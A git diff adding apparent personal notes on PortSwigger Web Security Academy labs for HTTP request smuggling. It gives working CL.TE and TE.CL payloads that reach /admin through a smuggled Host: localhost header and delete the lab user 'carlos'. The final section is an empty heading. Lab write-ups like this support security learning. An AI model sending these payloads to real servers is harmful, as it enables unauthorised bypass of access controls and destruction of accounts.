@@ -59,7 +59,165 @@ GET /404 HTTP/1.1
 X-Ignore: X
 ```
 
-### 
+### HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
+
+Send this twice
+
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5e
+POST /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+```
+
+### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+
+- try to go to /admin
+- use repeater and issue the following request twice
+
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-Ignore: X
+```
+
+- the request gets denied due to not having the `Host:Localhost` header
+- send the below requst twice
+
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+X-Ignore: X
+```
+
+- the request was blocked due to the second request's Host header conflicting with the smuggled Host header.
+- now do this so that the second requests headers are appened to the smuggled request body instead, and send twice
+
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 116
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+```
+
+- you can now access the admin panel, craft the delection of carlos like so:
+
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 139
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+```
+
+### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+
+- similar to above go to /admin see that you're blocked, so send blow twice
+
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-length: 4
+Transfer-Encoding: chunked
+
+60
+POST /admin HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+```
+
+**You need to include the trailing sequence \r\n\r\n following the final 0**
+
+- make sure to include the `Host:localhost` header
+
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+71
+POST /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+```
+
+- now delete carlos
+
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-length: 4
+Transfer-Encoding: chunked
+
+87
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+```
+
+### Exploiting HTTP request smuggling to reveal front-end request rewriting
+
+
+
+
+
+
 
 
 
